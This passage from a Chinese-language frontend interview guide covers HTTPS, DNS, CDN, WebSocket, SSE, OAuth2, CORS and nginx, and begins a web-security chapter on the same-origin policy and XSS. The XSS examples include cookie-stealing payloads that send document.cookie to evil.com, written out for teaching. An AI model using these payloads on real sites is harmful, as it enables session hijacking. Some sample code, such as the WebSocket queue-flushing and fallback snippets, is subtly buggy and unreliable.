const { publicKey, privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });

// 3. 混合加密（TLS/HTTPS 使用）
/*
  1. ECDHE 密钥交换（双方各自生成临时密钥对，交换公钥）
  2. 双方用 ECDH 计算 pre-master secret（不需要传输私钥！）
  3. 用 PRF 派生出对称密钥
  4. 用对称密钥加密实际通信数据

  优势: 前向保密（PFS — Perfect Forward Secrecy）
*/
```

---

### 6.9 CA 证书链与 HSTS

#### 证书链验证

```
证书链结构:
                    根证书 (Root CA)  ─── 自签名，浏览器内置
                         │
                         ▼
                   中间证书 (Intermediate CA)
                         │
                         ▼
                    站点证书 (End-entity) ─── 域名持有者申请

浏览器验证流程:
1. 收到服务器证书
2. 查找中间证书（AIA 字段下载）
3. 验证每个证书的签名链
4. 检查 CRL/OCSP 吊销状态
5. 验证域名匹配、时间有效性
```

```http
# HSTS (HTTP Strict Transport Security)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

参数:
  max-age: 浏览器强制使用 HTTPS 的时间（秒）
  includeSubDomains: 子域名也强制 HTTPS
  preload: 申请加入浏览器内置 HSTS 预加载列表
```

---

### 6.10 DNS 为什么用 UDP vs DNS 污染

```
DNS 使用 UDP 的原因:
1. 低延迟: UDP 无握手，查询速度极快
2. 简单性: DNS 设计于 1983 年，协议简单高效
3. 轻量: 每个 DNS 响应通常 < 512 bytes

DNS 何时使用 TCP:
1. 响应超过 512 bytes（DNSSEC 签名数据大）
2. 区域传输 (AXFR)
3. DoT/DoH (DNS over TLS/HTTPS)

DNS 污染防御:
1. DNSSEC（DNS Security Extensions）— 用公钥签名 DNS 记录
2. DoH (DNS over HTTPS) — DNS 查询通过加密通道传输
3. DoT (DNS over TLS)
```

---

### 6.11 CDN 原理

```
CDN 架构图:

用户 ──> 浏览器
            │
            ▼
     ┌─────────────────────────────┐
     │      CDN 全球边缘节点        │
     │   (Edge Server / PoP)       │
     │                               │
     │  北京用户 ──> 北京边缘节点    │  成都用户 ──> 成都边缘节点
     │  上海用户 ──> 上海边缘节点    │  深圳用户 ──> 深圳边缘节点
     └─────────────────────────────┘
            │  (miss 时) 回源
            ▼
     ┌─────────────────┐
     │   CDN 源站       │
     │  (Origin Server) │
     └─────────────────┘
```

#### CDN 工作流程

```
Step 1: 用户首次访问
  用户 ──> CDN 边缘节点 (MISS) ──> CDN 源站 ──> 返回并缓存

Step 2: 其他用户访问
  用户 ──> CDN 边缘节点 (HIT) ──> 直接返回（毫秒级）

Step 3: 缓存过期
  用户 ──> CDN 边缘节点 (EXPIRED) ──> 协商缓存 ──> 更新 TTL

CDN 加速原理:
1. 就近访问（地理优化）— 物理距离减少 = RTT 降低
2. 减少源站压力 — 热点资源被边缘节点缓存
3. 协议优化 — HTTP/2 多路复用、Brotli 压缩、TLS 终止
4. 边缘计算 — Cloudflare Workers / AWS CloudFront Functions
```

---

### 6.12 WebSocket 原理

```
WebSocket 与 HTTP 对比:

HTTP/1.1                  WebSocket
  Client ── HTTP ──>         Client ── HTTP 升级 ──>
  Client <── HTTP <──        Client <═══ WS 双向 ═══<──
  Client ── HTTP ──>         (双向实时通信)
```

#### WebSocket 握手

```http
# HTTP 升级请求（浏览器自动完成）
GET /ws HTTP/1.1
Host: api.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://example.com

# 服务器响应
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

#### WebSocket 帧结构

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+---------------+-------------------------------+
|F|R|R|R| opcode|M|     mask      |         payload length        |
|I|S|S|S|  (4)  |A|     (1)       |             (7/16/64)          |
|N|V|V|V|       |S|               |                               |
+-+-+-+-+-------+-+---------------+-------------------------------+
|     payload len (7 bits)       |  extended payload length      |
+---------------------------------+-------------------------------+
|                   Masking-Key (if mask bit is 1)                |
+---------------------------------+---------------------------------+
|                           Payload Data                           |
+-----------------------------------------------------------------------------:

opcode: 0x1=文本帧, 0x2=二进制帧, 0x8=关闭, 0x9=Ping, 0xA=Pong
```

#### WebSocket 心跳与断线重连

```javascript
class WebSocketClient {
  constructor(url, options = {}) {
    this.url = url;
    this.reconnectInterval = options.reconnectInterval || 3000;
    this.maxReconnectAttempts = options.maxReconnectAttempts || 10;
    this.heartbeatInterval = options.heartbeatInterval || 30000;
    this.reconnectAttempts = 0;
    this.ws = null;
    this.manualClose = false;
    this.messageQueue = [];
    this.connect();
  }

  connect() {
    this.ws = new WebSocket(this.url);
    this.ws.onopen = () => {
      this.reconnectAttempts = 0;
      this.startHeartbeat();
      this.flushQueue();
    };
    this.ws.onmessage = (e) => {
      if (e.data === 'pong') return;  // 心跳响应
      this.handleMessage(e.data);
    };
    this.ws.onclose = () => {
      this.stopHeartbeat();
      if (!this.manualClose) this.reconnect();
    };
  }

  startHeartbeat() {
    this.heartbeatTimer = setInterval(() => {
      if (this.ws.readyState === WebSocket.OPEN) {
        this.ws.send('ping');
      }
    }, this.heartbeatInterval);
  }

  reconnect() {
    if (this.reconnectAttempts >= this.maxReconnectAttempts) return;
    const delay = this.reconnectInterval * Math.pow(1.5, this.reconnectAttempts);
    setTimeout(() => {
      this.reconnectAttempts++;
      this.connect();
    }, delay);
  }

  send(data) {
    if (this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(typeof data === 'string' ? data : JSON.stringify(data));
    } else {
      this.messageQueue.push(data);  // 队列消息，连接恢复后发送
    }
  }

  close() {
    this.manualClose = true;
    this.stopHeartbeat();
    this.ws.close(1000, 'Client closed');
  }

  flushQueue() {
    while (this.messageQueue.length > 0) {
      this.ws.send(typeof this.messageQueue.shift() === 'string'
        ? this.messageQueue.shift()
        : JSON.stringify(this.messageQueue.shift()));
    }
  }
}
```

---

### 6.13 SSE vs WebSocket vs 长轮询

#### 6.13.1 核心定义

**Server-Sent Events（SSE）**：一种基于 HTTP 的轻量级协议，用于实现服务器→客户端的**单向实时推送**。浏览器通过 `EventSource` API 建立持久 HTTP 连接，服务器随时可发送事件流，浏览器自动解析并触发 `onmessage` 回调。

**WebSocket**：基于 TCP 的独立协议，**全双工**双向通信。双方可随时互相发送帧，无需 HTTP 升级（详见 1.6 节）。

**长轮询（Long Polling）**：HTTP 轮询的变种，客户端发送请求后服务器**挂起**，直到有数据或超时才返回响应；客户端收到响应后立即发起新请求。

#### 6.13.2 SSE 协议规范与数据格式

SSE 的数据传输使用 **MIME 类型 `text/event-stream`**，每个事件由多行文本组成，以**双换行符（`\n\n`）**作为分隔：

```
字段: 值\n
字段: 值\n
\n
data: {"price": 100.5}\n
\n
id: 42\n
event: stock_update\n
data: {"symbol": "AAPL", "price": 175.3}\n
retry: 5000\n
\n
```

**字段说明：**

| 字段 | 作用 |
|------|------|
| `data:` | 事件负载（可多行，会拼接在一起，以 `\n\n` 结束） |
| `id:` | 事件 ID，浏览器自动维护 `Last-Event-ID`，断线后自动在 `Last-Event-ID` header 中发送，用于服务器回溯补发 |
| `event:` | 事件类型（默认 `message`，可自定义类型如 `stock_update`） |
| `retry:` | 断线后重连间隔（毫秒，默认约 3s，服务器可覆盖） |
| `:comment` | 注释行（忽略，用于心跳保活） |

**服务端 Node.js 实现（Express）：**
```javascript
app.get('/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no'); // 禁用 nginx 缓冲
  res.flushHeaders(); // 立即发送 HTTP 头，不要等 body

  const sendStockUpdate = (symbol, price) => {
    res.write(`event: stock_update\n`);
    res.write(`data: ${JSON.stringify({ symbol, price, ts: Date.now() })}\n\n`);
  };

  const interval = setInterval(() => {
    sendStockUpdate('AAPL', (170 + Math.random() * 5).toFixed(2));
  }, 1000);

  req.on('close', () => {
    clearInterval(interval);
    console.log('[SSE] 客户端断开');
  });
});
```

**客户端 `EventSource` API：**
```javascript
const es = new EventSource('/stream');

// 默认 message 事件（event:type 未指定时）
es.onmessage = (e) => {
  console.log('[默认事件]', e.data); // e.data 是纯字符串
};

// 自定义事件类型
es.addEventListener('stock_update', (e) => {
  const data = JSON.parse(e.data);
  console.log(`[${data.symbol}] ${data.price}`);
});

// 连接状态
es.onopen = () => console.log('[SSE] 连接已建立');
es.onerror = (e) => {
  console.error('[SSE] 连接错误', e);
  // EventSource 自动重连（除非 readyState === CLOSED）
  if (es.readyState === EventSource.CLOSED) {
    console.log('[SSE] 连接已永久关闭，需手动重连');
  }
};

// 手动关闭
es.close();

// 获取最后的事件 ID（用于断线后重连）
console.log('Last-Event-ID:', es.lastEventId);
```

#### 6.13.3 重连机制（Last-Event-ID 与断线恢复）

SSE 的自动重连是面试高频考点：

```
连接正常时：
  服务器发送 → id:42 → data:{...}

断线重连时：
  客户端 HTTP 请求 header 自动带上：
    Last-Event-ID: 42

  服务器可从 Redis/MQ 中读取 id≥42 的未发消息，
  从断线位置开始补发，实现"消息不丢失"
```

> ⚠️ **常见误解**：浏览器只在 **SSE 断线重连**时自动发送 `Last-Event-ID`。如果想每次消息都带 ID，服务器必须主动在每次事件中发送 `id:` 字段。

#### 6.13.4 三方案完整对比表

| 维度 | **SSE** | **WebSocket** | **长轮询** | **短轮询** |
|------|:-------:|:-------------:|:----------:|:----------:|
| 通信方向 | **单向（服务端→客户端）** | **全双工** | 客户端轮询，服务端可推 | 客户端轮询 |
| 连接特性 | 长连接（HTTP） | 长连接（TCP） | 每次请求后关闭再发起 | 短连接（每次请求后关闭） |
| 协议 | HTTP（text/event-stream） | ws:// / wss:// | HTTP | HTTP |
| HTTP 头开销 | 仅首次握手有头 | 仅握手有头（帧头 2 字节） | 每轮询次都带完整 HTTP 头 | 每轮次都带完整 HTTP 头 |
| 自动重连 | ✅ 原生 EventSource | ❌ 需手动实现 | ❌ 需手动实现 | N/A |
| 断线消息补发 | ✅ via Last-Event-ID | ❌ 需应用层实现 | ❌ 需应用层实现 | ❌ |
| 二进制数据 | ❌ 仅文本（UTF-8） | ✅ 原生二进制帧 | ✅ | ✅ |
| 单连接多路复用 | ✅（HTTP/2） | ❌（每连接一流） | ❌ | ❌ |
| 穿过代理 | ✅ | ⚠️（可能被降级为 HTTP） | ✅ | ✅ |
| 复杂度 | 低 | 中高 | 中 | 低 |
| IE/Edge Legacy | ❌ | ❌ | ✅ | ✅ |
| 适用场景 | 推送通知、实时数据、股票/天气、AI 流式输出 | 聊天、游戏、实时协作 | 兼容旧系统、低频更新 | 低频状态轮询 |

#### 6.13.5 选型决策树

```
需要实时通信？
  │
  ├─ 只需服务端推送（服务器→浏览器）？
  │   │
  │   ├─ 消息量极大（>10k 连接）？→ SSE（HTTP/2 多路复用更优）
  │   ├─ 需 AI/LLM 流式输出？→ SSE（原生的 ReadableStream 支持，fetch + EventSource）
  │   └─ 普通推送（通知、行情）→ SSE（最简单，推荐）
  │
  └─ 需要双向通信（浏览器→服务器）？
      │
      ├─ 延迟敏感（<100ms），游戏/协作？→ WebSocket
      ├─ 消息可靠性要求极高？→ WebSocket + 应用层 ACK
      └─ 低频（每隔几秒才发一条）→ SSE（客户端用 fetch POST 发请求）
```

#### 6.13.6 常见坑点与最佳实践

| 坑点 | 说明 | 解决方案 |
|------|------|----------|
| **nginx 默认缓冲 SSE** | nginx 收到响应后才转发，导致实时变"批量" | `proxy_buffering off;` 或设置响应头 `X-Accel-Buffering: no` |
| **nginx 超时断开** | 默认 `proxy_read_timeout 60s` 导致连接被斩断 | `proxy_read_timeout 86400;` |
| **SSE 连接数限制** | 浏览器同源 HTTP 连接数有限制（HTTP/1.1 通常 6 个） | 改用 HTTP/2；或合并多个 SSE 流为 1 个 |
| **EventSource 不支持 POST** | `EventSource` 只接受 GET，无法发送认证信息 | 配合 fetch + 一次性 token 方案；或用 cookie/Authorization header |
| **多标签页重复连接** | 每个标签页都会新建 SSE 连接 | 服务端维护心跳；或使用 SharedWorker / BroadcastChannel |
| **SSE 无法穿透代理** | 某些企业代理不认识 SSE，流被截断 | 降级为轮询；或使用 WebSocket over TLS（WSS） |
| **浏览器关闭时连接不通知服务端** | 客户端页面关闭/切换，SSE 连接不会发送 close 通知 | 使用 `navigator.sendBeacon` 在页面卸载时发通知；或服务端心跳超时判定 |

**Node.js + Redis Pub/Sub 实现多人 SSE 广播：**
```javascript
// 服务端：Redis 广播，多个 SSE 客户端可订阅同一频道
const redis = require('redis');
const subscriber = redis.createClient();

app.get('/stream/:userId', async (req, res) => {
  const { userId } = req.params;
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const channel = `user:${userId}:events`;
  subscriber.subscribe(channel, (message) => {
    // 新消息到达，立即发送给 SSE 客户端
    res.write(`data: ${message}\n\n`);
  });

  req.on('close', () => {
    subscriber.unsubscribe(channel);
  });
});
```

#### 6.13.7 高频面试追问

**Q1：AI 大模型的流式输出为什么用 SSE 而不是 WebSocket？**
> SSE 与 SSE 在 LLM 流式输出中的差异：
> 1. **语义匹配**：`fetch()` 返回的 `ReadableStream` 可直接通过 `TextDecoderStream` 转为 SSE 格式，前端只需 `EventSource` 或 fetch 流式消费
> 2. **天然单向**：LLM 推理只有服务端输出，无需客户端推送，SSE 语义完全吻合
> 3. **标准 HTTP 兼容**：SSE 是标准 HTTP，长连接穿越代理和 CDN 比 WebSocket 更容易
> 4. **自动重连**：EventSource 自动处理断线重连，对 AI 流式对话场景友好
> 5. **简单实现**：服务端只需每生成一个 token 就 `res.write()` 一行数据，无需维护复杂的状态

**Q2：SSE 能否实现浏览器向服务器发送数据？**
> 原生 `EventSource` **只支持 GET**，但有几种 workaround：
> 1. **同域下额外建立 WebSocket 连接** 用于客户端→服务端（常见方案）
> 2. **用 `fetch('POST')` 发送指令**，SSE 专门接收服务器推送
> 3. **EventSource 支持自定义 URL，服务器根据 URL 参数路由不同频道**

**Q3：SSE 与 WebSocket 在 Node.js 生态中的性能差异？**
> - **SSE**：基于 HTTP，长连接复用，Node.js 的单线程 event loop 中大量 SSE 连接主要消耗内存而非 CPU，适合高并发单向推送（如直播弹幕）
> - **WebSocket**：需要维护状态化的连接帧解析，适合双向通信；大量连接时推荐使用 `uWebSockets.js` / `ws` 库的 cluster 模式或 Redis pub/sub 水平扩展

**Q4：WebSocket 断开后，SSE 能否作为降级方案？**
> 是的，这是生产环境中的标准降级策略：
```javascript
// 优先尝试 WebSocket，失败则降级为 SSE
let transport = null;
if (new WebSocket) {
  try {
    const ws = new WebSocket(url);
    transport = ws;
  } catch {
    transport = new EventSource(url);
  }
} else {
  transport = new EventSource(url);
}
```

> 📚 参考：
> - [MDN - Using server-sent events](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events)
> - [SSE 技术详解](https://cloud.tencent.com/developer/article/1194063)
> - [实时技术对比: SSE vs WebSocket vs Long Polling](https://cloud.tencent.com/developer/article/2521124)
> - [SSE (Server-Sent Events) 协议详解](https://blog.csdn.net/jkzyx123/article/details/145704261)

---

### 6.14 RESTful vs GraphQL

#### RESTful 流行原因

```
RESTful 设计原则:
1. 资源导向: 所有内容都是资源（/users, /orders, /products）
2. HTTP 语义: GET(查), POST(增), PUT(改), DELETE(删), PATCH(部分改)
3. 无状态: 每个请求包含所有必要信息
4. 分层系统: 客户端不需要知道服务端架构
```

#### GraphQL 为什么出现

```
RESTful 的问题:
1. Over-fetching（过度获取）
   /api/user/123 返回整个对象，但前端只需要 name + avatar

2. Under-fetching（不足获取）/ N+1 问题
   首页需要: 用户信息 + 朋友列表 + 最新帖子
   REST: GET /user → GET /friends → GET /posts

3. 端点爆炸
   /api/v1/users → /api/v2/users → ...
```

```graphql
# GraphQL 查询示例
query {
  user(id: "123") {
    name
    avatar
    friends(first: 5) {
      name
      avatar
    }
  }
}

# 响应（精确匹配请求的字段，无冗余）
{
  "data": {
    "user": {
      "name": "Alice",
      "avatar": "https://...",
      "friends": [...]
    }
  }
}
```

---

### 6.15 HTTP 状态码大全

```http
1xx 信息性状态码（处理中）
100 Continue           # 客户端继续发送请求
101 Switching Protocols # WebSocket 升级

2xx 成功状态码
200 OK                # 请求成功
201 Created           # 资源创建成功
202 Accepted          # 请求已接受，但处理未完成（异步任务）
204 No Content        # 请求成功，但无返回内容

3xx 重定向状态码
301 Moved Permanently  # 永久重定向（SEO 友好，更新书签）
302 Found              # 临时重定向（保持原请求方法）
303 See Other          # POST -> GET
304 Not Modified       # 协商缓存命中
307 Temporary Redirect # 临时重定向（保持原请求方法）
308 Permanent Redirect # 永久重定向（保持原请求方法）

4xx 客户端错误状态码
400 Bad Request        # 请求格式错误
401 Unauthorized       # 未认证
403 Forbidden          # 已认证但无权限
404 Not Found          # 资源不存在
405 Method Not Allowed # HTTP 方法不支持
409 Conflict           # 资源冲突（用户名已存在）
412 Precondition Failed # ETag 验证失败
429 Too Many Requests   # 请求频率超限

5xx 服务器错误状态码
500 Internal Server Error # 服务器内部错误
502 Bad Gateway            # 网关错误（上游服务器返回错误响应）
503 Service Unavailable    # 服务不可用（过载/维护）
504 Gateway Timeout        # 网关超时
```

---

### 6.16 301/302/307/308 区别

```http
┌──────────┬───────────────┬────────────────────┐
│ 状态码   │ 永久/临时      │ 方法是否改变        │
├──────────┼───────────────┼────────────────────┤
│ 301      │ 永久          │ ⚠️ POST 可能变 GET  │
├──────────┼───────────────┼────────────────────┤
│ 302      │ 临时          │ ⚠️ POST 可能变 GET  │
├──────────┼───────────────┼────────────────────┤
│ 303      │ 临时          │ ❌ 强制变为 GET     │
├──────────┼───────────────┼────────────────────┤
│ 307      │ 临时          │ ✅ 严格保持原方法   │
├──────────┼───────────────┼────────────────────┤
│ 308      │ 永久          │ ✅ 严格保持原方法   │
└──────────┴───────────────┴────────────────────┘

// 实际建议:
永久重定向: 308 (标准) / 301 (兼容旧浏览器)
临时重定向: 307 (标准) / 302 (兼容旧浏览器)
POST 处理后重定向: 303 (强制 GET)
```

---

### 6.17 GET vs POST vs PUT vs PATCH vs 幂等性

| 特性 | GET | POST | PUT | PATCH | DELETE |
|------|-----|------|-----|-------|--------|
| 语义 | 获取资源 | 创建/处理资源 | 完整替换资源 | 部分修改资源 | 删除资源 |
| 请求体 | 无（查询参数在 URL） | 支持 | 支持 | 支持 | 通常无 |
| 幂等性 | 是 | 否 | 是 | 否 | 是 |
| 缓存 | 可缓存 | 通常不缓存 | 不缓存 | 不缓存 | 不缓存 |

```http
# GET 示例
GET /users?page=1&limit=20 HTTP/1.1

# POST 示例 — 创建资源（返回 201 Created）
POST /users HTTP/1.1
{ "name": "Alice", "email": "alice@example.com" }

# PUT 示例 — 完整替换（幂等）
PUT /users/123 HTTP/1.1
{ "name": "Alice Updated", "email": "alice@example.com" }

# PATCH 示例 — 部分修改（非幂等）
PATCH /users/123 HTTP/1.1
{ "email": "newemail@example.com" }
```

---

### 6.18 OAuth2 原理

```
OAuth2 Authorization Code 流程:

1. 用户点击"用 Google 登录"
   重定向到 Google 授权服务器:
   https://accounts.google.com/o/oauth2/v2/auth?
     client_id=YOUR_CLIENT_ID
     &redirect_uri=https://your-app.com/callback
     &response_type=code
     &scope=openid%20profile%20email
     &state=RANDOM_STATE

2. 用户在 Google 登录并授权
   授权服务器返回:
   https://your-app.com/callback?code=AUTH_CODE&state=RANDOM_STATE

3. Client 服务器用 Authorization Code 换取 Token
   POST https://oauth2.googleapis.com/token
   grant_type=authorization_code
   &code=AUTH_CODE
   &client_secret=YOUR_CLIENT_SECRET

   响应:
   { "access_token": "ya29.xxx", "refresh_token": "1//xxx", "expires_in": 3600 }
```

#### JWT vs Session

```javascript
// JWT 签发
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { sub: 'user123', role: 'admin' },
  'secret-key',
  { expiresIn: '1h', algorithm: 'HS256' }
);

// JWT 验证
try {
  const decoded = jwt.verify(token, 'secret-key');
  console.log(decoded);
} catch (e) { console.error('Invalid token'); }

// JWT vs Session:
/*
| 特性         | JWT                          | Session               |
|-------------|-----------------------------|----------------------|
| 存储位置      | 客户端（Token 本身）           | 服务器（Redis/DB）     |
| 扩展性       | 好（无状态，多服务器无同步）    | 需 Session 共享/粘性    |
| 撤销         | 困难（需黑名单/短期 Token）    | 简单（删除服务端 Session）|
| 安全性       | ❌ 泄露 = 无法撤销             | ✅ 可立即撤销           |
| JWT 不够安全的原因:                           |
| 1. 无法主动撤销                              |
| 2. 泄露风险（若非 HttpOnly Cookie 存储）      |
| 3. 无加密（Payload 是 Base64 可读）           |
*/
```

---

### 6.19 CORS 原理

#### 简单请求 vs 复杂请求

```
简单请求（同时满足以下所有条件）:
1. 方法: GET / HEAD / POST
2. Header: 仅包含简单头 + 自定义安全头
   Content-Type 只能是:
   - application/x-www-form-urlencoded
   - multipart/form-data
   - text/plain

复杂请求（需预检 Preflight）:
1. 方法: PUT / DELETE / PATCH
2. Header: 非简单头 (Authorization, Content-Type 不是简单值)
3. Content-Type 不是简单值（如 application/json）
```

```
预检请求流程:
浏览器 ── OPTIONS (Origin + Access-Control-Request-Method) ──> 服务器
        <── Access-Control-Allow-Origin / Methods / Headers ─────
        ── 实际请求 ─────────────────────────────────────────> 服务器
        <── 正常响应 ───────────────────────────────────────────
```

#### CORS 完整配置

```http
# 服务器响应头
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

---

### 6.20 nginx 正向代理 vs 反向代理 vs 负载均衡

```
正向代理 vs 反向代理:

正向代理: 代理站在客户端侧，代表客户端
          用户 ──> 正向代理 ──> 目标网站
          用途: 翻墙、企业内网过滤

反向代理: 代理站在服务器侧，代表服务器
          用户 ──> 反向代理 ──> 应用服务器 A/B/C
          用途: 负载均衡、安全防护、SSL 终止
```

```nginx
upstream backend {
    ip_hash;
    server 10.0.0.1:8080 weight=3;
    server 10.0.0.2:8080 weight=1;
    keepalive 32;
}

server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate /etc/nginx/ssl/example.com.crt;
    ssl_certificate_key /etc/nginx/ssl/example.com.key;
    ssl_protocols TLSv1.2 TLSv1.3;

    location /api/ {
        proxy_pass http://backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Connection "";
    }

    location /static/ {
        alias /var/www/static/;
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
}
```

#### nginx 负载均衡算法

```nginx
# 1. 轮询（默认）
server 10.0.0.1:8080;
server 10.0.0.2:8080;

# 2. 加权轮询
server 10.0.0.1:8080 weight=3;
server 10.0.0.2:8080 weight=1;

# 3. IP Hash（Session 保持）
ip_hash;

# 4. 最少连接
least_conn;

# 5. URL Hash（缓存友好）
hash $request_uri consistent;
```

#### nginx 静态资源缓存

```nginx
# 策略1: 基于文件指纹（最推荐）
location /static/ {
    expires 1y;
    add_header Cache-Control "public, max-age=31536000, immutable";
}

# 策略2: 基于扩展名
location ~* \.(js|css|png|jpg|ico|svg|woff2)$ {
    expires 30d;
}

# 策略3: HTML 禁止缓存
location ~* \.html$ {
    expires -1;
    add_header Cache-Control "no-cache, no-store, must-revalidate";
}

# 策略4: CDN + 源站缓存
location / {
    proxy_cache my_cache;
    proxy_cache_valid 200 10m;
    proxy_cache_use_stale error timeout http_500 http_502 http_503;
    add_header X-Cache-Status $upstream_cache_status;
}
```


---

## Chapter 7: Web安全终极题库

### 7.1 Web安全本质与浏览器安全模型

#### 7.1.1 Web安全本质

Web安全本质是**在不可信的网络环境中构建可信的应用**。攻击者的目标是窃取数据、劫持会话、执行任意代码；防御者的目标是确保数据的机密性、完整性和可用性（CIA 三元组）。

浏览器作为Web应用的运行时，是安全攻防的主战场。浏览器安全模型由多层防护机制构成：

```
┌─────────────────────────────────────────────────────┐
│                    浏览器安全模型                      │
├─────────────────────────────────────────────────────┤
│  1. 进程隔离          (渲染进程 vs 浏览器主进程)        │
│  2. 同源策略 (SOP)     (域间隔离)                      │
│  3. 沙箱机制           (限制代码能力)                   │
│  4. 安全上下文          (HTTPS / localhost)           │
│  5. CSP / CORS         (资源加载控制)                  │
│  6. CORB / CORP / COEP  (侧信道攻击缓解)               │
│  7. SameSite Cookie    (CSRF防护)                    │
└─────────────────────────────────────────────────────┘
```

#### 7.1.2 浏览器进程隔离

现代浏览器使用**多进程架构**：

```
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│  浏览器主进程  │   │  渲染进程 A   │   │  渲染进程 B   │
│  (Browser)   │   │  (Renderer)  │   │  (Renderer)  │
│              │   │              │   │              │
│  - 地址栏     │   │  - JS引擎    │   │  - JS引擎    │
│  - 网络请求   │   │  - DOM树     │   │  - DOM树     │
│  - 插件管理   │   │  - 布局引擎   │   │  - 布局引擎   │
│  - 存储管理   │   │  - 事件循环   │   │  - 事件循环   │
└──────────────┘   └──────────────┘   └──────────────┘
        ↑                  ↑                  ↑
        └──────────────────┴──────────────────┘
                    IPC 进程间通信
```

每个标签页运行在独立的渲染进程中，通过IPC与浏览器主进程通信。渲染进程的JS无法直接访问文件系统、网络进程只能通过MessageChannel与渲染进程通信。

---

### 7.2 同源策略 (Same-Origin Policy, SOP)

#### 7.2.1 什么是同源

**同源**指协议 + 域名 + 端口三者完全相同。

| URL A                          | URL B                      | 是否同源    |
|--------------------------------|----------------------------|-----------|
| `https://a.example.com:443`    | `https://a.example.com:443`| 同源        |
| `https://a.example.com:443`    | `https://b.example.com:443`| 不同源(域不同)|
| `https://a.example.com:443`    | `http://a.example.com:443` | 不同源(协议不同)|
| `https://a.example.com:443`    | `https://a.example.com:8080`| 不同源(端口不同)|

#### 7.2.2 SOP限制了什么

同源策略限制以下跨域行为：

```
┌──────────────────────────────────────────────┐
│              同源策略 (SOP) 限制               │
├──────────────────────────────────────────────┤
│  ✗ Cookie / LocalStorage / IndexedDB 访问    │
│  ✗ DOM 跨域读写                               │
│  ✗ XMLHttpRequest / Fetch 跨域请求            │
│  ✗ iframe 跨域内容访问                         │
│                                               │
│  ✓ <script src> (可跨域加载JS)                │
│  ✓ <link href> (可跨域加载CSS)                │
│  ✓ <img src> (可跨域加载图片)                  │
│  ✓ @font-face 跨域字体                         │
└──────────────────────────────────────────────┘
```

#### 7.2.3 为什么必须有SOP

如果浏览器没有SOP，任意网页的JS都能读取`bank.com`的Cookie、DOM和LocalStorage：

```javascript
// 恶意网站 https://evil.com 的JS
fetch('https://bank.com/api/balance')  // 自动携带cookie
  .then(r => r.json())
  .then(data => sendToAttacker(data));

document.getElementById('bank-frame').contentDocument; // 读取iframe内容
```

**SOP是浏览器安全的基石**，它将Web划分为安全域，防止恶意脚本访问敏感资源。

---

### 7.3 XSS（跨站脚本攻击）

#### 7.3.1 什么是XSS

XSS（Cross-Site Scripting）指攻击者将恶意脚本注入到受信任的网页中执行。

**为什么XSS极其危险？**

```
XSS 能做的事:
  1. 窃取 Cookie/Token      → 劫持用户会话
  2. 读取 LocalStorage      → 窃取敏感数据
  3. 监听键盘输入           → 窃取密码/信用卡号
  4. 修改DOM               → 伪造登录框钓鱼
  5. 调用Web API           → 以受害者身份操作
  6. 蠕虫传播               → 自动扩散到其他用户
```

#### 7.3.2 XSS分类

```
┌──────────────────────────────────────────────────────┐
│                     XSS 三种类型                       │
├──────────────┬───────────────┬───────────────────────┤
│   存储型XSS   │   反射型XSS     │      DOM型XSS          │
├──────────────┼───────────────┼───────────────────────┤
│ 恶意代码永久   │ URL参数中携带   │ 前端JS从URL/DOM读取    │
│ 保存在服务器   │ 恶意脚本,服务器 │ 数据并直接写入DOM,     │
│               │ 直接拼接返回    │ 不经过服务器           │
│ 危害最大       │ 危害较小       │ 危害较小               │
│ 典型:评论/帖子  │ 典型:搜索结果   │ 典型: #fragment参数    │
└──────────────┴───────────────┴───────────────────────┘
```

**反射型XSS示例：**

```php
<!-- 服务器直接将URL参数输出到HTML -->
<p>搜索结果: <?php echo $_GET['q']; ?></p>

<!-- 攻击URL -->
https://site.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

<!-- 服务器返回 -->
<p>搜索结果: <script>fetch('https://evil.com/steal?c='+document.cookie)</script></p>
```

**存储型XSS示例：**

```javascript
// 攻击者在评论区发表:
用户名: hacker
评论内容: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// 该评论存入数据库,所有访问该页面的用户都会执行恶意脚本
```

**DOM型XSS示例：**

```javascript
// 前端JS直接读取URL hash并写入页面
const hash = location.hash;  // #<img src=x onerror=alert(1)>
document.getElementById('output').innerHTML = decodeURIComponent(hash.substring(1));
// 无需服务器参与,纯前端即可触发
```

#### 7.3.3 存储型/反射型/DOM型XSS区别

```
攻击流程对比:

存储型XSS:
  攻击者 → 提交恶意脚本 → 服务器(持久化) → 其他用户访问 → 脚本执行
           ↓数据库
        [恶意脚本永久保存]

反射型XSS:
  攻击者 → 构造恶意URL → 受害者点击URL → 服务器解析参数 → 脚本执行
           URL参数       (拼接进响应)    (不持久化)

DOM型XSS:
  攻击者 → 构造恶意URL → 受害者点击URL → 前端JS解析 → 直接修改DOM
           URL/hash      (纯前端处理)    (无需服务器参与)
```

**核心区别：**

| 维度       | 存储型           | 反射型           | DOM型           |
